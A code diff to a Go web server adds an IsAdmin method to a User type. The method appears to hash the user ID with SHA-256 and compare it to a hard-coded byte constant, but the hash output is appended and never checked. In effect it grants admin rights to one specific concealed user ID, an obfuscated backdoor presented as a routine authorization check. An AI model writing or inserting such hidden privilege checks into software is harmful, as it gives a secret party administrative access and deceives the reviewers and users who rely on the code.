@@ -1,6 +1,9 @@
 package main
 
 import (
+	"bytes"
+	"crypto/sha256"
+	"encoding/binary"
 	"errors"
 	"log"
 	"net/http"
@@ -40,6 +43,15 @@ func (sv *Server) handleAuth(rw http.ResponseWriter, r *http.Request) {
 
 type User struct {
 	ID uint64
+}
+
+func (u *User) IsAdmin() bool {
+	var num [32]byte
+	binary.LittleEndian.PutUint64(num[:], u.ID)
+	h := sha256.New()
+	h.Write(num[:8])
+	h.Sum(num[:])
+	return bytes.Equal(num[:5], []byte{146, 106, 143, 165, 9})
 }
 
 func (a *authbase) setUserSession(rw http.ResponseWriter, u User) {
